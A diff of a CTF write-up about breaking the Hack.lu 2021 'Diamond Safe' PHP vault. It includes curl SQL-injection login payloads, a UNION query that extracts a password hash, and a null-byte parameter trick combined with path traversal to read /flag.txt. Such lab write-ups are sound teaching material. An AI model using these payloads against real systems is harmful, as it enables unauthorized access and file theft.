@@ -4,18 +4,26 @@
 
 [Hacl.lu CTF](https://flu.xxx/) was a great surprise for me as a never heard about it before. And it's rated 94.98! It is organized by the official CTF team of the german Ruhr University Bochum (RUB).
 
+The Stock Market design in the page is great!
+
 I was able to take a look at only one challenge, and that was really fun and creative.
 
 ## The Challenge
 
 ![Main Page](img/logo.png)
 
-In this challenge, made by [@kunte_](https://twitter.com/kunte_ctf?s=20), we have a vault for storing safe data (like a simpler Last Pass).
+In this challenge, made by [@kunte_](https://twitter.com/kunte_ctf), we have a vault for storing safe data (like a simpler Last Pass).
 It is password-protected and without registration, so we also have to find our way in.
 
 The challenge give us the php source code and docker compose configuration, so we have a place to start and test locally.
 
 There is a vault page, but it is session-protected, so we have to bypass the Login anyway.
+
+The challenge has 3 layers, the app containers:
+
+nginx -> php-fpm -> mysql
+
+Flag is located in **/flag.txt** inside the php-fpm docker container.
 
 ## Breaking the login
 
@@ -23,6 +31,8 @@ The source code is kind of big, so we won't get into the usual detailed-level an
 First, let's analyze how to bypass the login.
 
 ### Database: Prepare Query
+
+* [DB.class.php](https://github.com/Neptunians/hack.lu-ctf-2021/blob/main/diamond-safe_26dd85a08b507ce268064e2015fb1f8c/public/src/DB.class.php)
 
 ```php
 public static function prepare($query, $args){
@@ -78,6 +88,8 @@ The fact that he made it's own implementation of a function so critical for secu
 The strategy taken here is flawed, but we can see it clearly in a later step.
 
 ### Login Validation
+
+* [login.php](https://github.com/Neptunians/hack.lu-ctf-2021/blob/main/diamond-safe_26dd85a08b507ce268064e2015fb1f8c/public/src/login.php)
 
 ```php
 if (isset($_POST['password'])){
@@ -288,7 +300,7 @@ curl 'https://diamond-safe.flu.xxx/login.php' \
   --data-raw 'password=mysecret%25s&name[]=)%20or%202%3C%3E(&name[]=default'
 ```
 
-Enough bullshit. Run it!
+Enough of this bullshit. Run it!
 
 ```html
 $ curl 'https://diamond-safe.flu.xxx/login.php' \
@@ -332,12 +344,202 @@ Hacked!
 
 ![Main Page](img/vault.png)
 
+But wait... we don't have the flag yet. We only got in the game!
+
+## Hunting the Flag
+
+The Secure Files section of our Vault is the obvious lead here, since we can download files from the server. [My last last write-up](https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/) on ASIS CTF 2021 was about a [Local File Inclusion - LFI](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion), so it was kind of automatic.
+
+The link format for downloading files is this:
+
+```text
+https://diamond-safe.flu.xxx/download.php?h=f2d03c27433d3643ff5d20f1409cb013&file_name=FlagNotHere.txt
+```
+
+We have a file_name and a hash.
+
+### Understanding The Download:
+
+* [download.php](https://github.com/Neptunians/hack.lu-ctf-2021/blob/main/diamond-safe_26dd85a08b507ce268064e2015fb1f8c/public/src/download.php)
+
+```php
+include_once("functions.php");
+include_once("config.php");
+
+
+$_SESSION['CSRFToken'] = md5(random_bytes(32));
+
+if (!isset($_SESSION['is_auth']) or !$_SESSION['is_auth']){
+    redirect('login.php');
+    die();
+}
+
+if(!isset($_GET['file_name']) or !is_string($_GET['file_name'])){
+    redirect('vault.php');
+    die();
+}
+
+if(!isset($_GET['h']) or !is_string($_GET['h'])){
+    redirect('vault.php');
+    die();
+}
+
+// check the hash
+if(!check_url()){
+    redirect('vault.php');
+    die();
+}
+
+
+$file = '/var/www/files/'. $_GET['file_name'];
+if (!file_exists($file)) {
+    redirect('vault.php');
+    die();
+}
+else{
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($file).'"');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    readfile($file);
+    exit;
+}
+```
+
+#### **Summary**:
+* Validates that the user is authenticated.
+* Validates the parameters **file_name** and **h**: non-empty and string.
+* Checks the URL (Let's deep dive on it, because it checks for the hash)
+* If the validation returns True, sends the file with this name, inside the /var/www/files/ directory.
+    * It does not protect from [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal) here. 
+    * This is our probable LFI.
+
+Seems fine except... we have to bypass this check_url() validation. Let's take a look:
+
+* [functions.php](https://github.com/Neptunians/hack.lu-ctf-2021/blob/main/diamond-safe_26dd85a08b507ce268064e2015fb1f8c/public/src/download.php)
+
+```php
+function check_url(){
+    // fixed bypasses with arrays in get parameters
+    $query  = explode('&', $_SERVER['QUERY_STRING']);
+
+    $params = array();
+    foreach( $query as $param ){
+        // prevent notice on explode() if $param has no '='
+        if (strpos($param, '=') === false){
+            $param += '=';
+        }
+        list($name, $value) = explode('=', $param, 2);
+        $params[urldecode($name)] = urldecode($value);
+
+    }
+
+    if(!isset($params['file_name']) or !isset($params['h'])){
+        return False;
+    }
+
+    $secret = getenv('SECURE_URL_SECRET');
+    $hash = md5("{$secret}|{$params['file_name']}|{$secret}");
+
+    if($hash === $params['h']){
+        return True;
+    }
+
+    return False;
+}
+```
+
+#### **Summary**:
+* Takes the entire query string and break it in an array of strings (separated by "&")
+* For each item, fills a **$param** dictionary with name and value, separating by "=".
+* Use this parameter to check for **file_name** and **h**
+* Generate the hash:
+    * Get the server **SECURE_URL_SECRET** environment variable, which we don't have.
+    * Prepare a string like SECURE_URL_SECRET|file_name|SECURE_URL_SECRET.
+    * Make a MD5 hash from it.
+* If the calculated hash is the same hash sent in **h**, return True, for validated URL.
+
+### Hunting for the wrong flaws
+
+At this point I got stuck for some time, trying different things.
+
+* I first tried to generate a correct hash for my /flag.txt path traversal.
+    * It didn't work, since it only generate hashes for files inside the /var/www/files/ directory.
+* I guessed the **default** user password inside the database could be the same as the hash.
+    * I got the server sha1 password by changing my sql injection a little bit:
+
+```sql
+SELECT * FROM `users` where password=sha1('mysecret') union all select 1, password, 2 from users where 2<>('') and name='default'
+```
+
+Since the second column is now the password (not username), it shows the **default** user sha1-encrypted password in the vault main page. But I couldn't crack the password.
+
+* I guessed that the SECURE_URL_SECRET could be weak.
+    * Since we have two MD5 hash samples, I tried to crack it.
+    * I tried breaking it using the [in]famous rockyou wordlist.
+    * For this, I generated a wordlist in the challenge format: ```<word>|Diamond.txt|<word>```
+    * Of course, no luck :)
+    * Kept the code (in the repo) just for fun.
+* I even read some things about MD5 collisions but... I was playing solo, without some great crypto hackers from FireShell, and gave up pretty quickly.
+
+I went back to the code analysis.
+
+### Custom Implementations + Specification Ambiguity == Hacking
+
+The obvious path to look was the custom implementation for reading the parameters in the **check_url** function. There is no reason to parse the ```$_SERVER['QUERY_STRING']```, when you can just ```$_GET['file_name']``` and ```$_GET['h']```. Even so, I kicked my ass.
+
+The flaw must be some difference of this custom parsing versus the php-fpm parsing of the URL.
+Different parsing implementations of the same complex or ambiguous specifications lead to some very interesting vulnerabilities. 
+
+I got a flaw like this in the [m0lecon CTF 2021](https://m0lecon.it/), in a very interesting challenge called [Waffle](https://neptunian.medium.com/m0lecon-ctf-2021-teaser-bypassing-waf-5393c1c5f278), where we have different JSON Parsing implementations on Go and Python, leading to WAF bypass.
+
+The key here was to try some different parsing behaviour (or buggy, or strange, ...) in both implementations. The intentation was to make the **file_name** be Diamond.txt inside ```$params``` the **check_url**, but a different **file_name** for download.php, so it would validate with one, but download another.
+
+I just "fuzzied" some small changes, like putting a second file_name without the "=":
+
+```text
+https://diamond-safe.flu.xxx/download.php?h=95f0dc5903ee9796c3503d2be76ad159&file_name=Diamond.txt&file_name
+```
+
+It worked, beucase of the buggy ```$param += '='``` in **check_url()**, but the file_name was null and it was not enough to get the flag.
+
+After some more fuzz... guessing, I got this:
+
+```text
+https://diamond-safe.flu.xxx/download.php?h=95f0dc5903ee9796c3503d2be76ad159&file_name=Diamond.txt&file_name%00=../../../flag.txt
+```
+
+It turns out the %00 is ignored in the php implementation, but not in the **check_url**. And then we got our LFI:
+
+```bash
+$ curl --path-as-is 'https://diamond-safe.flu.xxx/download.php?file_name=Diamond.txt&h=95f0dc5903ee9796c3503d2be76ad159&file_name%00=../../../flag.txt' \
+>   -H 'Neptunian: neptunian-value' \
+>   -H 'Cookie: PHPSESSID=3d9dc29debc998c9c40b3007319ebed5'
+
+flag{lul_php_challenge_1n_2021_lul}
+```
+
+### Day is Won!
+
+```flag{lul_php_challenge_1n_2021_lul}```
+
+![Main Page](img/victory_by_karatastamer_d5t1lsz.jpg)
+*Credits: https://www.deviantart.com/karatastamer/art/Victory-351114659*
+
 ## References
 
 * Hack.lu CTF 2021: https://flu.xxx/
 * CTF Time Event: https://ctftime.org/event/1452/
+* Challenge Creator: [@kunte_](https://twitter.com/kunte_ctf)
 * SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
 * Format String Attack: https://owasp.org/www-community/attacks/Format_string_attack
+* Local File Inclusion: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+* Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
+* ASIS CTF 2021 - ASCII Art as a Service: https://fireshellsecurity.team/asisctf-ascii-art-as-a-service/
+* m0lecon CTF 2021 - Waffle Write-Up: https://neptunian.medium.com/m0lecon-ctf-2021-teaser-bypassing-waf-5393c1c5f278
 * Repo with the artifacts discussed here: https://github.com/Neptunians/hack.lu-ctf-2021
 * Team: [FireShell](https://fireshellsecurity.team/)
 * Team Twitter: [@fireshellst](https://twitter.com/fireshellst)
